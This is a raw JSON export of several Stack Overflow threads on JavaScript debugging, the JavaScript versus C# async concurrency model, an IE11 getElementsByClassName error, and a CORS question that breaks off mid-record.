launches?"}], "answers": [{"comments": [{"owner": {"reputation": 133, "user_id": 11343547, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-RwEjH2fhIII/AAAAAAAAAAI/AAAAAAAAAK0/xWk5kvw6cek/photo.jpg?sz=128", "display_name": "Louis", "link": "https://stackoverflow.com/users/11343547/louis"}, "edited": false, "score": 0, "creation_date": 1558562077, "post_id": 56265496, "comment_id": 99147292, "body": "Well now my console log work but it still doesn&#39;t give me the total. Do you have any idea what&#39;s wrong with my code?"}, {"owner": {"reputation": 133, "user_id": 11343547, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-RwEjH2fhIII/AAAAAAAAAAI/AAAAAAAAAK0/xWk5kvw6cek/photo.jpg?sz=128", "display_name": "Louis", "link": "https://stackoverflow.com/users/11343547/louis"}, "edited": false, "score": 0, "creation_date": 1558562710, "post_id": 56265496, "comment_id": 99147467, "body": "I put these lines before the calTotal, but it still doesn&#39;t return the total. I can&#39;t seem to find the error in my code"}], "tags": [], "owner": {"reputation": 14233, "user_id": 916000, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/eumU0.png?s=128&g=1", "display_name": "Taha Paksu", "link": "https://stackoverflow.com/users/916000/taha-paksu"}, "is_accepted": true, "score": 2, "last_activity_date": 1558563022, "last_edit_date": 1558563022, "creation_date": 1558561906, "answer_id": 56265496, "question_id": 56265415, "link": "https://stackoverflow.com/questions/56265415/function-doesnt-execute-properly-inside-of-javascript/56265496#56265496", "title": "Function doesn&#39;t execute properly inside of JavaScript", "body": "<p>Try wrapping your function with </p>\n\n<pre><code>(function calTotal() { \n    //...contents\n})();\n</code></pre>\n\n<p>Which will convert the function definition to IIFE, and your event listeners will be bound.</p>\n\n<p><a href=\"https://stackoverflow.com/questions/8228281/what-is-the-function-construct-in-javascript\">What is the (function() { } )() construct in JavaScript?</a></p>\n\n<p>Or just add <code>calTotal();</code> just before <code>&lt;/script&gt;</code></p>\n\n<p>and move these lines into the event handler, or make them globally accessible:</p>\n\n<pre><code>const grandTotalEl = document.getElementById('grandTotal')\nconst inputEls = tableEl.querySelectorAll('input[name=quantity]')\n</code></pre>\n\n<hr>\n\n<p>Ok, change your code like this:</p>\n\n<pre><code>&lt;script&gt; \n    function calTotal() {\n        const updateGrandTotal = () =&gt; {\n            const tableEl = document.getElementById('articles')\n            const grandTotalEl = document.getElementById('grandTotal')\n            const inputEls = tableEl.querySelectorAll('input[name=quantity]')\n            grandTotalEl.innerText = inputEls.reduce((total, inputEl) =&gt; {\n                const maxQuantity = parseInt(inputEl.dataset.maxQuantity)\n                if(parseInt(inputEl.value) &gt; maxQuantity) inputEl.value = maxQuantity\n                else if(parseInt(inputEl.value) &lt; 0) inputEl.value = 0\n\n                const price = parseFloat(inputEl.dataset.price)\n                const quantity = parseInt(inputEl.value)\n\n                console.log(\"hello\");\n\n                if(isNaN(quantity)) return total\n\n                return total + (price * quantity)\n            }, 0)\n        }\n\n        quantityInputEls.forEach(el =&gt; el.addEventListener('keyup', () =&gt; updateGrandTotal(grandTotalEl, inputEls)))\n    };\n&lt;/script&gt;\n</code></pre>\n\n<p>Then you can debug it at your developer tools window to see what's not working.</p>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user11487450"}, "is_accepted": false, "score": 0, "last_activity_date": 1558562387, "creation_date": 1558562387, "answer_id": 56265552, "question_id": 56265415, "link": "https://stackoverflow.com/questions/56265415/function-doesnt-execute-properly-inside-of-javascript/56265552#56265552", "title": "Function doesn&#39;t execute properly inside of JavaScript", "body": "<pre><code>// Create javascript-only function for loaded DOM\nfunction readyFired(callback) {\n    document.readyState != 'complete' ? setTimeout('readyFired(' + callback + ')', 1) : callback();\n}\n\n// DOM is fully-loaded and ready to calculate the total\nreadyFired(function() {\n    calTotal();\n});\n</code></pre>\n"}], "owner": {"reputation": 133, "user_id": 11343547, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-RwEjH2fhIII/AAAAAAAAAAI/AAAAAAAAAK0/xWk5kvw6cek/photo.jpg?sz=128", "display_name": "Louis", "link": "https://stackoverflow.com/users/11343547/louis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 48, "favorite_count": 1, "accepted_answer_id": 56265496, "answer_count": 2, "score": 0, "last_activity_date": 1558563022, "creation_date": 1558561375, "question_id": 56265415, "link": "https://stackoverflow.com/questions/56265415/function-doesnt-execute-properly-inside-of-javascript", "title": "Function doesn&#39;t execute properly inside of JavaScript", "body": "<p>I have this function inside of JavaScript that is supposed to calculate the total price of the product selected inside of php. When I load my page, the console logs outside of my function work but the ones inside don't. Do I have a mistake in my code that causes it to not execute?</p>\n\n<pre><code>&lt;?php\nif ($result-&gt;num_rows &gt; 0) {\n    // output data of each row\n    while($row = $result-&gt;fetch_assoc()) {\n      ?&gt;\n      &lt;tr&gt;\n          &lt;td&gt;&lt;?= htmlentities($row['id']); ?&gt;&lt;/td&gt;\n          &lt;td&gt;&lt;?= htmlentities($row['Article']); ?&gt;&lt;/td&gt;\n          &lt;td&gt;&lt;?= htmlentities($row['Prix']); ?&gt;&lt;/td&gt;\n          &lt;td&gt;&lt;?= htmlentities($row['PrixRetour']); ?&gt;&lt;/td&gt;\n          &lt;td&gt;&lt;?= htmlentities($row['QuantiteeMaximale']); ?&gt;&lt;/td&gt;\n          &lt;td&gt;&lt;?= htmlentities($row['Projet']); ?&gt;&lt;/td&gt;\n          &lt;td&gt;&lt;input data-price='&lt;?= floatval($row['Prix']); ?&gt;' data-max-quantity='&lt;?= intval($row['QuantiteeMaximale']); ?&gt;' type=\"number\" name=\"quantity\"&gt;&lt;/td&gt;\n      &lt;/tr&gt;\n      &lt;?php\n    }\n    ?&gt;\n    &lt;/table&gt;\n    &lt;p&gt;Grand Total: $&lt;span id='grandTotal'&gt;&lt;/span&gt;&lt;/p&gt;\n    &lt;script&gt;\n        console.log(\"test1\");\n        function calTotal() {\n            console.log(\"test2\");\n            const tableEl = document.getElementById('articles')\n            const grandTotalEl = document.getElementById('grandTotal')\n            const inputEls = tableEl.querySelectorAll('input[name=quantity]')\n            const updateGrandTotal = (grandTotalEl, inputEls) =&gt; {\n                grandTotalEl.innerText = inputEls.reduce((total, inputEl) =&gt; {\n                    const maxQuantity = parseInt(inputEl.dataset.maxQuantity)\n\n                    if(parseInt(inputEl.value) &gt; maxQuantity) inputEl.value = maxQuantity\n                    if(parseInt(inputEl.value) &lt; 0) inputEl.value = 0\n\n                    const price = parseFloat(inputEl.dataset.price)\n                    const quantity = parseInt(inputEl.value)\n\n                    console.log(\"hello\");\n\n                    if(isNaN(quantity)) return total\n\n                    return total + (price * quantity)\n                }, 0)\n            }\n            console.log(\"test3\");\n\n            quantityInputEls.forEach(el =&gt; el.addEventListener('keyup', () =&gt; updateGrandTotal(grandTotalEl, inputEls)))\n        };\n    &lt;/script&gt;\n    &lt;?php\n} else {\n    echo \"0 results\";\n}\n$conn-&gt;close();\n?&gt;\n</code></pre>\n"}, {"tags": ["javascript", "c#", "asynchronous", "concurrency"], "comments": [{"owner": {"reputation": 11274, "user_id": 9078341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TAD0A.png?s=128&g=1", "display_name": "Randy Casburn", "link": "https://stackoverflow.com/users/9078341/randy-casburn"}, "edited": false, "score": 0, "creation_date": 1558561452, "post_id": 56265355, "comment_id": 99147139, "body": "This: <i>Is this correct? From what I understand it essentially means there can be no race conditions or deadlock or I ever need to protect shared resource.</i> Yes - it is called &quot;<i>Run to Completion</i>&quot; in JavaScript. Logic errors can create race conditions where a dev expects something to be set prior to completion, but that is due to a code problem - not a concurrency problem."}, {"owner": {"reputation": 11274, "user_id": 9078341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TAD0A.png?s=128&g=1", "display_name": "Randy Casburn", "link": "https://stackoverflow.com/users/9078341/randy-casburn"}, "edited": false, "score": 0, "creation_date": 1558561524, "post_id": 56265355, "comment_id": 99147163, "body": "Have you seen this? <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop\" rel=\"nofollow noreferrer\">developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop</a>"}, {"owner": {"reputation": 51, "user_id": 11541740, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d40154497f356d015ad5e85bb2b808c?s=128&d=identicon&r=PG&f=1", "display_name": "Kirikan", "link": "https://stackoverflow.com/users/11541740/kirikan"}, "reply_to_user": {"reputation": 11274, "user_id": 9078341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TAD0A.png?s=128&g=1", "display_name": "Randy Casburn", "link": "https://stackoverflow.com/users/9078341/randy-casburn"}, "edited": false, "score": 0, "creation_date": 1558561903, "post_id": 56265355, "comment_id": 99147246, "body": "@RandyCasburn Yes, that is what essentially the <code>quoted text</code> in my post explains."}, {"owner": {"reputation": 11274, "user_id": 9078341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TAD0A.png?s=128&g=1", "display_name": "Randy Casburn", "link": "https://stackoverflow.com/users/9078341/randy-casburn"}, "edited": false, "score": 0, "creation_date": 1558561966, "post_id": 56265355, "comment_id": 99147262, "body": "As I suspected, just wanted to make sure. @jonas has a terrific answer for you."}, {"owner": {"reputation": 73231, "user_id": 156142, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7dcad6d7e959ef6d6cfd67c6fb15c171?s=128&d=identicon&r=PG", "display_name": "ChaosPandion", "link": "https://stackoverflow.com/users/156142/chaospandion"}, "edited": false, "score": 0, "creation_date": 1558569227, "post_id": 56265355, "comment_id": 99148853, "body": "You should switch this: <code>groups.length &lt; 1 || groups === undefined</code> into this <code>!groups || groups.length &lt; 1</code> the former might throw an error."}], "answers": [{"comments": [{"owner": {"reputation": 51, "user_id": 11541740, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d40154497f356d015ad5e85bb2b808c?s=128&d=identicon&r=PG&f=1", "display_name": "Kirikan", "link": "https://stackoverflow.com/users/11541740/kirikan"}, "edited": false, "score": 0, "creation_date": 1558561774, "post_id": 56265458, "comment_id": 99147212, "body": "&quot;Because there are no shared ressources[...]&quot; /// how come? The <code>groups</code> array in my code <i>supposedly</i> a shared collection. i say supposedly because I thought <code>AddEntry()</code> can execute any time, even during the moment when <code>sendPOST()</code> iterates through it because <code>AddEntry()</code> <b>is</b> a callback, technically. Also, the code example you provided makes no sense, you made erroneous lock on purpose, you do not use lock that way. I&#39;m talking about race condition due to concurrency when no locks used."}, {"owner": {"reputation": 94146, "user_id": 477420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0eb05243292dee6726c128660d31583b?s=128&d=identicon&r=PG", "display_name": "Alexei Levenkov", "link": "https://stackoverflow.com/users/477420/alexei-levenkov"}, "reply_to_user": {"reputation": 51, "user_id": 11541740, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d40154497f356d015ad5e85bb2b808c?s=128&d=identicon&r=PG&f=1", "display_name": "Kirikan", "link": "https://stackoverflow.com/users/11541740/kirikan"}, "edited": false, "score": 0, "creation_date": 1558561991, "post_id": 56265458, "comment_id": 99147274, "body": "@Kirikan what is your definition of &quot;shared resource&quot; (in context of thread safety)? Since regular JavaScript is singlethreaded (as Jonas Wilms mentioned in the answer) there is no &quot;shared resources&quot; if regular thread safety meaning (resource accessed by multiple thread)..."}, {"owner": {"reputation": 94146, "user_id": 477420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0eb05243292dee6726c128660d31583b?s=128&d=identicon&r=PG", "display_name": "Alexei Levenkov", "link": "https://stackoverflow.com/users/477420/alexei-levenkov"}, "reply_to_user": {"reputation": 51, "user_id": 11541740, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d40154497f356d015ad5e85bb2b808c?s=128&d=identicon&r=PG&f=1", "display_name": "Kirikan", "link": "https://stackoverflow.com/users/11541740/kirikan"}, "edited": false, "score": 0, "creation_date": 1558562110, "post_id": 56265458, "comment_id": 99147301, "body": "@Kirikan there are no locks in code in the answer - could you please clarify what you mean &quot;you made erroneous lock on purpose&quot;? (again - locks make no sense for single-threaded environment)"}, {"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "reply_to_user": {"reputation": 51, "user_id": 11541740, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d40154497f356d015ad5e85bb2b808c?s=128&d=identicon&r=PG&f=1", "display_name": "Kirikan", "link": "https://stackoverflow.com/users/11541740/kirikan"}, "edited": false, "score": 0, "creation_date": 1558562130, "post_id": 56265458, "comment_id": 99147307, "body": "@kirikan no. No code will run at the same time. Yes <code>AddEntry</code> is a callback. That means that code might run in the mea time <i>before</i> it was called and <i>after it finished</i>, but the function itself does only run if no other code is executing."}, {"owner": {"reputation": 51, "user_id": 11541740, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d40154497f356d015ad5e85bb2b808c?s=128&d=identicon&r=PG&f=1", "display_name": "Kirikan", "link": "https://stackoverflow.com/users/11541740/kirikan"}, "reply_to_user": {"reputation": 94146, "user_id": 477420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0eb05243292dee6726c128660d31583b?s=128&d=identicon&r=PG", "display_name": "Alexei Levenkov", "link": "https://stackoverflow.com/users/477420/alexei-levenkov"}, "edited": false, "score": 0, "creation_date": 1558562238, "post_id": 56265458, "comment_id": 99147344, "body": "@AlexeiLevenkov So how async queries are handled? Doesnt JS VM uses context switching too? In this case you dont need multiple threads, if context switches during your iteration process and then processes the AddEntry code you get the similar situation that can happen in C# async environment even with a single thread."}, {"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "reply_to_user": {"reputation": 51, "user_id": 11541740, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d40154497f356d015ad5e85bb2b808c?s=128&d=identicon&r=PG&f=1", "display_name": "Kirikan", "link": "https://stackoverflow.com/users/11541740/kirikan"}, "edited": false, "score": 0, "creation_date": 1558562296, "post_id": 56265458, "comment_id": 99147366, "body": "@kirikan no. There are no threads. Forget about everything you&#39;ve learnt with C#."}, {"owner": {"reputation": 94146, "user_id": 477420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0eb05243292dee6726c128660d31583b?s=128&d=identicon&r=PG", "display_name": "Alexei Levenkov", "link": "https://stackoverflow.com/users/477420/alexei-levenkov"}, "edited": false, "score": 0, "creation_date": 1558562460, "post_id": 56265458, "comment_id": 99147397, "body": "@JonasWilms actually C# and JS are very similar in a way &quot;async&quot; works - both schedule completion callback (with the portion of a method after <code>await</code>) on proper thread - which in many cases on C# is UI thread and in JS is <i>the only</i> thread. (whether it is helpful or not - open question)"}, {"owner": {"reputation": 94146, "user_id": 477420, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0eb05243292dee6726c128660d31583b?s=128&d=identicon&r=PG", "display_name": "Alexei Levenkov", "link": "https://stackoverflow.com/users/477420/alexei-levenkov"}, "reply_to_user": {"reputation": 51, "user_id": 11541740, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d40154497f356d015ad5e85bb2b808c?s=128&d=identicon&r=PG&f=1", "display_name": "Kirikan", "link": "https://stackoverflow.com/users/11541740/kirikan"}, "edited": false, "score": 1, "creation_date": 1558565213, "post_id": 56265458, "comment_id": 99148084, "body": "@Kirikan there is no &quot;context switching&quot; in JavaScript. All code runs till completion synchronously and only after that engine will pick next piece of code to run synchronously. &quot;Next piece&quot; is either top level code (next JS file) or next callback (external like click/http response or timer). <code>await</code>/<code>async</code> is just nice syntax for constructing callback on promise resolution (which is itself just wrapper around callbacks)."}, {"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558601482, "post_id": 56265458, "comment_id": 99157790, "body": "@alexeiLenkov I just read through the C# docs, and I agree that Promises and Tasks are quite similar. However as they are both &quot;just wrappers for callbacks&quot;, and callbacks behave quite differently in C# and JS, it is still difficult to compare them."}], "tags": [], "owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "is_accepted": true, "score": 2, "last_activity_date": 1558562523, "last_edit_date": 1558562523, "creation_date": 1558561617, "answer_id": 56265458, "question_id": 56265355, "link": "https://stackoverflow.com/questions/56265355/javascript-async-vs-c-async/56265458#56265458", "title": "JavaScript async vs C# async", "body": "<blockquote>\n  <p>Is this correct? </p>\n</blockquote>\n\n<p>Yes, it describes adequately whats happening.</p>\n\n<p>JS runs in a single threaded way, which means that a function will always run till it's end.</p>\n\n<pre><code> setTimeout(function concurrently() {\n   console.log(\"this will never run\");\n });\n\n  while(true) console.log(\"because this is blocking the only thread JS has\");\n</code></pre>\n\n<blockquote>\n  <p>there can be no race conditions ...</p>\n</blockquote>\n\n<p>There can (in a logical way). However, they cannot appear in synchronous code, as JavaScript runs single threaded\u00b9. If you add a callback to something, or <code>await</code> a promise, then other code might run in the <em>meantime</em> (but never <em>at the same time!</em>), which might cause a race condition:</p>\n\n<pre><code> let block = false;\n\n async function run() {\n   if(block) return // only run this once\n   // If we'd do block = true here, this would be totally safe\n   await Promise.resolve(); // things might get out of track here\n   block = true;\n   console.log(\"whats going on?\");\n}\n\nrun(); run();\n</code></pre>\n\n<blockquote>\n  <p>... nor deadlocks ...</p>\n</blockquote>\n\n<p>Yes, they are quite impossible (except if you use Atomics\u00b9).</p>\n\n<blockquote>\n  <p>I never need to protect shared resource.</p>\n</blockquote>\n\n<p>Yes. Because there are no shared ressources (okay, except SharedBuffers\u00b9).</p>\n\n<hr>\n\n<p>\u00b9: By using WebWorkers (or threads on NodeJS), you actually control multiple JS threads. However each thread runs its own JS code, so variables are not shared. These threads can pass messages between each other and they can also share a specific memory construct (a <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/SharedArrayBuffer\" rel=\"nofollow noreferrer\">SharedArrayBuffer</a>). That can then be accessed concurrently, and all the effects of concurrent access apply (but you will rarely use it, so ...).</p>\n"}], "owner": {"reputation": 51, "user_id": 11541740, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d40154497f356d015ad5e85bb2b808c?s=128&d=identicon&r=PG&f=1", "display_name": "Kirikan", "link": "https://stackoverflow.com/users/11541740/kirikan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 291, "favorite_count": 0, "accepted_answer_id": 56265458, "answer_count": 1, "score": 1, "last_activity_date": 1558567881, "creation_date": 1558561071, "last_edit_date": 1558567881, "question_id": 56265355, "link": "https://stackoverflow.com/questions/56265355/javascript-async-vs-c-async", "title": "JavaScript async vs C# async", "body": "<p><strong>EDIT</strong>: found the answer - <a href=\"https://www.youtube.com/watch?v=8aGhZQkoFbQ\" rel=\"nofollow noreferrer\">https://www.youtube.com/watch?v=8aGhZQkoFbQ</a></p>\n\n<p>_</p>\n\n<p>Okay, so I have some C# background and C# \"async environment\" is a bit of a mixed bag of concurrency and \"<a href=\"https://msdn.microsoft.com/en-us/magazine/jj991977.aspx\" rel=\"nofollow noreferrer\">small parallelism</a>\" i.e. when it comes to heavy async environment you <strong><em>can</em></strong> have race conditions, deadlock and you need to protect shared resources.</p>\n\n<p>Now, I'm trying to understand how does JavaScript/ES6 async environment works. Consider following code:</p>\n\n<pre class=\"lang-js prettyprint-override\"><code>// current context: background \"page\"\n// independent from content page\nlet busy = false;\n\n// This is an event handler that receives event from content page\n// It can happen at any time\nruntimeObj.onMessage.addListener((request) =&gt;\n{\n    if(request.action === 'AddEntry')\n    {\n        AddEntry(request);\n        return true;\n    }\n    return false;\n} );\n\n\nfunction AddEntry(data)\n{\n    if (!busy)\n        group.push({url: data.url, time: Date.now(), session: data.session});\n    else\n        setTimeout(AddEntry(data),10000) // simulating Semaphore wait\n}\n\n// called from asynchronous function setInterval()\nfunction SendPOST()\n{\n    if (groups.length &lt; 1 || groups === undefined)\n        return;\n\n    busy = true; // JS has no semaphores so I \"simulate it\"\n    let del = [];\n    groups.forEach(item =&gt;\n    {\n        if (Date.now() - item.time &gt; 3600000)\n        {\n            del.push(item);\n            let xhr = new XMLHttpRequest();\n            let data = new FormData();\n            data.append('action', 'leave');\n            data.append('sessionID', item.session);\n            xhr.withCredentials = true;\n            http.onreadystatechange = function()\n            {\n                if(http.readyState == 4 &amp;&amp; http.status !== 200) {\n                    console.log(`Unable to part group ${item.url}! Reason: ${http.status}. Leave group manually.`)\n            }\n}\n            xhr.open('POST', item.url, true);\n            xhr.send(data);\n        }\n    });\n    del.forEach(item =&gt; groups.slice(item,1));\n    busy = false;\n}\n\n\nsetInterval(SendPOST, 60000);\n</code></pre>\n\n<p>This is not really the best example, since it does not have bunch of async keyword paired with functions but in my understanding both <code>sendPost()</code> and <code>AddEntry()</code> arent really pure sequential operations. Nonetheless, I've been told that in <code>AddEntry()</code>, <code>busy</code> always will be <code>false</code> because:</p>\n\n<blockquote>\n  <p>sendPost is queued to execute in a minute</p>\n  \n  <p>an event is add to the event loop</p>\n  \n  <p>the event is processed and AddEntry is called</p>\n  \n  <p>since busy = false the group is pushed</p>\n  \n  <p>a minute passes and SendPost is added to the event loop</p>\n  \n  <p>the event is process and SendPost is called</p>\n  \n  <p>groups.length === 1 so it continues</p>\n  \n  <p>busy = true</p>\n  \n  <p>each group causes a request to get queued</p>\n  \n  <p>an event comes in</p>\n  \n  <p>busy = false</p>\n  \n  <p>the event is processed, AddEntry is called</p>\n  \n  <p>busy is false, like it will always be</p>\n  \n  <p>group is pushed</p>\n  \n  <p>eventually the requests from before are resolved, and t\n  he onreadystatechange callbacks are put on the event loop</p>\n  \n  <p>eventually each of the callbacks are processed and the logging statements are executed</p>\n</blockquote>\n\n<p>Is this correct? From what I understand it essentially means there can be no race conditions or deadlock or I ever need to protect shared resource.</p>\n\n<p>If I'm two write a <em>similar code</em> for C# runtime where <code>sendPost()</code> and <code>AddEntry()</code> are asynchronous task methods that can be called in non-blocking way from different event sources there <strong>could</strong> situation when I access shared resource while the iteration context is temporally suspended in context switch by Thread Sheduler.</p>\n"}, {"tags": ["javascript", "internet-explorer-11", "getelementsbyname"], "comments": [{"owner": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 1, "creation_date": 1558561053, "post_id": 56265315, "comment_id": 99147018, "body": "Are you able to show a working example, as IE11 certainly has <code>document.getElementsByClassName</code>"}, {"owner": {"reputation": 135520, "user_id": 1715579, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/4B4y1.png?s=128&g=1", "display_name": "p.s.w.g", "link": "https://stackoverflow.com/users/1715579/p-s-w-g"}, "edited": false, "score": 0, "creation_date": 1558561064, "post_id": 56265315, "comment_id": 99147022, "body": "Related: <a href=\"https://stackoverflow.com/q/7410949/1715579\">javascript document.getElementsByClassName compatibility with IE</a>"}, {"owner": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 1, "creation_date": 1558561268, "post_id": 56265315, "comment_id": 99147081, "body": "It&#39;s not a duplicate, this is not 2014 and IE8,   IE9+ has had this method."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1558561276, "post_id": 56265315, "comment_id": 99147086, "body": "Can&#39;t reproduce. My IE11 has <code>document.getElementsByClassName</code>."}, {"owner": {"reputation": 56607, "user_id": 695364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUNjJ.jpg?s=128&g=1", "display_name": "Scott Marcus", "link": "https://stackoverflow.com/users/695364/scott-marcus"}, "reply_to_user": {"reputation": 38349, "user_id": 10221765, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0e762fef8d87381d5cbd58d851d1b816?s=128&d=identicon&r=PG&f=1", "display_name": "Jack Bashford", "link": "https://stackoverflow.com/users/10221765/jack-bashford"}, "edited": false, "score": 2, "creation_date": 1558562341, "post_id": 56265315, "comment_id": 99147375, "body": "@JackBashford This is not a duplicate of the question you linked to. That question is about IE8, where <code>.getElementsByClassName()</code> wasn&#39;t implemented. This question is about IE11, where it is."}, {"owner": {"reputation": 8001, "user_id": 10309381, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a284b365772283540b23d67dbbbd2d2e?s=128&d=identicon&r=PG&f=1", "display_name": "Deepak-MSFT", "link": "https://stackoverflow.com/users/10309381/deepak-msft"}, "edited": false, "score": 0, "creation_date": 1558575944, "post_id": 56265315, "comment_id": 99150031, "body": "I made a test with your above code in IE 11 and this is the output. <a href=\"https://i.postimg.cc/Qd3GQDmW/35.gif\" rel=\"nofollow noreferrer\">i.postimg.cc/Qd3GQDmW/35.gif</a> You can see that your code is working fine in IE 11. So it looks like your above code does not have any issue. It can be possible that some other code in your web page causing this issue."}], "answers": [{"tags": [], "owner": {"reputation": 1641, "user_id": 910737, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/3b743ec6658424da2d83dcea225f37d6?s=128&d=identicon&r=PG", "display_name": "Sweepster", "link": "https://stackoverflow.com/users/910737/sweepster"}, "is_accepted": true, "score": 3, "last_activity_date": 1558620835, "creation_date": 1558620835, "answer_id": 56277194, "question_id": 56265315, "link": "https://stackoverflow.com/questions/56265315/ie-11-object-doesnt-support-property-or-method-getelementsbyclassname/56277194#56277194", "title": "IE 11: Object doesn&#39;t support property or method &#39;getElementsByClassName&#39;", "body": "<p>The fix is as follows:</p>\n\n<pre><code>&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=11\" /&gt;\n</code></pre>\n"}], "owner": {"reputation": 1641, "user_id": 910737, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/3b743ec6658424da2d83dcea225f37d6?s=128&d=identicon&r=PG", "display_name": "Sweepster", "link": "https://stackoverflow.com/users/910737/sweepster"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4366, "favorite_count": 0, "accepted_answer_id": 56277194, "answer_count": 1, "score": 2, "last_activity_date": 1558620835, "creation_date": 1558560833, "last_edit_date": 1558561544, "question_id": 56265315, "link": "https://stackoverflow.com/questions/56265315/ie-11-object-doesnt-support-property-or-method-getelementsbyclassname", "title": "IE 11: Object doesn&#39;t support property or method &#39;getElementsByClassName&#39;", "body": "<p>This is not a duplicate. Previous questions relate to IE8. This is occurring in IE11.</p>\n\n<p>I have no problems running this in Chrome or Firefox, but my code must function in IE11 and I am receiving the following error:</p>\n\n<p>Object doesn't support property or method 'getElementsByClassName'</p>\n\n<pre><code>function showNext(a) {\n    var questions = document.getElementsByClassName(\"questionholder\");\n    showRequired.style.display = \"none\";\n\n    for (var i = 0; i &lt; questions.length; i++) {\n        questions[i].style.display = \"none\";\n    }\n\n    var nextQuestion = document.getElementById(\"question\" + a);\n\n    if (nextQuestion !== null) {\n        nextQuestion.style.display = \"inline-block\";\n    }\n}\n</code></pre>\n\n<p>The code is supposed to be looking here:</p>\n\n<pre><code>&lt;form id=\"TheForm\" style=\"display:block;\"&gt;\n    &lt;div class=\"questionholder\" id=\"question0\" style=\"display:block\"&gt;\n        &lt;a class=\"text2button\" onclick=\"showNext(1)\"&gt;Start&lt;/a&gt;\n    &lt;/div&gt;\n    &lt;div class=\"questionholder\" id=\"question1\" style=\"display:block\"&gt;\n        &lt;a class=\"text2button\" onclick=\"showNext(2)\"&gt;Q1&lt;/a&gt;\n    &lt;/div&gt;\n    &lt;div class=\"questionholder\" id=\"question2\" style=\"display:block\"&gt;\n        &lt;a class=\"text2button\" onclick=\"showNext(3)\"&gt;Q2&lt;/a&gt;\n    &lt;/div&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>The code above will hide all divs and then show the div that matches the id \"question\"+a as determined by the button clicked.</p>\n\n<p>What can I do to resolve the above error?</p>\n"}, {"tags": ["javascript", "cors", "browser-security"], "comments": [{"owner": {"reputation": 10321, "user_id": 215552, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/26bda02894d869c95f620de4b7cd386d?s=128&d=identicon&r=PG", "display_name": "Heretic Monkey", "link": "https://stackoverflow.com/users/215552/heretic-monkey"}, "edited": false, "score": 1, "creation_date": 1558561457, "post_id": 56265296, "comment_id": 99147140, "body": "CORS is meant to be consumed by browsers (or other implementing user agents) to protect users of one domain from having their requests diverted to another (an attack that was common before CORS). Forcing an implementer to use a server-side proxy means that the implementer has taken on the risk burden for any malicious code that might get to users of their domain."}, {"owner": {"reputation": 7078, "user_id": 470062, "user_type": "registered", "accept_rate": 